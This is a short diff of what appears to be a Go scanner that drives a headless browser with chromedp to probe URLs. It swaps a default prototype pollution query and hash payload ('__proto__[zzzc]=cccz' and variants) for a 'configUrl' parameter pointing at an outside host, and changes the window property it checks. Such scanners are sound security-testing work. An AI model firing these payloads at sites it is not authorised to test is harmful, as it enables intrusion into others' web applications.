@@ -87,7 +87,7 @@ func main() {
 
 				err := chromedp.Run(ctx,
 					chromedp.Navigate(requestURL+hasQuery(requestURL)+URLpayload),
-					chromedp.Evaluate("window.zzzc", &res),
+					chromedp.Evaluate("window.xxx", &res),
 				)
 				//fmt.Println(requestURL + hasQuery(requestURL) + URLpayload)
 
@@ -133,7 +133,7 @@ func urlPayload() {
 	if !containsEmpty(customPayload) {
 		URLpayload = customPayload
 	} else {
-		URLpayload = "constructor.prototype.zzzc=cccz&__proto__[zzzc]=cccz&constructor[prototype][zzzc]=cccz&__proto__.zzzc=cccz#__proto__[zzzc]=cccz"
+		URLpayload = "?configUrl=https://te.ssrf.bar/test.json"
 
 	}
 }
